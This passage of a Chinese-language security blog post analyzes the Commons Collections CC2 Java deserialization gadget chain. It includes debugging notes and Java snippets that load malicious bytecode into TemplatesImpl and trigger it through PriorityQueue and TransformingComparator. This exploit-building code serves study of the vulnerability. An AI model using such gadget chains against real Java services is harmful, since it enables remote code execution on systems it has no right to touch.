+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">queue</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">initialCapacity</span><span style="color:#ff636f">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">comparator</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">comparator</span>;
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>而这个Comparator类型（TransformingComparator）里塞的就直接是chaintransform</p>
+<p>感觉是迄今为止最短的链子了</p>
+<p>readobject() - heapify() - siftDown()这几步都没有用到我们构造的Comparator，流畅转入下面的siftDownUsingComparator()</p>
+<p>调用<code>comparator.compare(x, (E) c)</code>，x是1 c是2  哈哈</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191609841.webp" alt="image-20240819160958593" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191609841.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191609841.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191609841.webp?size=large 2x" data-title="image-20240819160958593" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>到这里就离开PQ到了TransformingComparator，这里的this.transformer是chaintransform，老朋友了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191612161.webp" alt="image-20240819161211931" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191612161.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191612161.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191612161.webp?size=large 2x" data-title="image-20240819161211931" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最后调用到invoketransform</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191614368.webp" alt="image-20240819161410119" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191614368.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191614368.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191614368.webp?size=large 2x" data-title="image-20240819161410119" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h5 id="改进priorityqueue利链" class="heading-element"><span>0.0.0.3  改进PriorityQueue利⽤链</span>
+  <a href="#%e6%94%b9%e8%bf%9bpriorityqueue%e5%88%a9%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>既然有新的链子了，也可以像之前改shiro链子的时候一样，就像拼图一样，CC2这里我们新拿到了拼图PriorityQueue和TransformingComparator</p>
+<p>拿到了一个新的反序列化触发点和一个“中间地带”，相当于拿到一个新的触发transf</p>
+<p>感觉确实有点晕</p>
+<p>（思路是调用chaintransform对象那里直接换成invoketransform，invoketransform传入的对象不再是没用的对象，而是TemplatesImpl 对象）</p>
+<p>首先，还是创建TemplatesImpl 对象：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span>{<span style="color:#58a1dd">getBytescode</span>()});
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());</span></span></code></pre></div><p>创建⼀个⼈畜无害的InvokerTransformer 对象，并⽤它实例化Comparator ：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Transformer</span> <span style="color:#58a1dd">transformer</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;toString&#34;</span>, <span style="color:#ff636f">null</span>, <span style="color:#ff636f">null</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Comparator</span> <span style="color:#58a1dd">comparator</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformingComparator</span>(<span style="color:#58a1dd">transformer</span>);</span></span></code></pre></div><p>还是像上面一样实例化PriorityQueue ，但是此时向队列⾥添加的元素就是我们前⾯创建的TemplatesImpl 对象了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">PriorityQueue</span> <span style="color:#58a1dd">queue</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">PriorityQueue</span>(<span style="color:#58a1dd">2</span>, <span style="color:#58a1dd">comparator</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">queue</span>.<span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">queue</span>.<span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">obj</span>);</span></span></code></pre></div><p>ps:，invoketransform传入的对象不再是没用的对象，而是TemplatesImpl 对象</p>
+<p>稍微调试一下</p>
+<p>可以看到这里不再是之前没用的数字了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191644082.webp" alt="image-20240819164437884" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191644082.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191644082.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191644082.webp?size=large 2x" data-title="image-20240819164437884" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>关键点</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191645553.webp" alt="image-20240819164542319" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191645553.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191645553.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191645553.webp?size=large 2x" data-title="image-20240819164542319" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>到这里就是之前分析过的内容了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191646329.webp" alt="image-20240819164614108" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191646329.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191646329.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191646329.webp?size=large 2x" data-title="image-20240819164614108" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-19 16:48:01">Updated on 2024-08-19&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" class="post-nav-item" rel="prev" title="Shiro反序列化原理调试分析"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Shiro反序列化原理调试分析</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
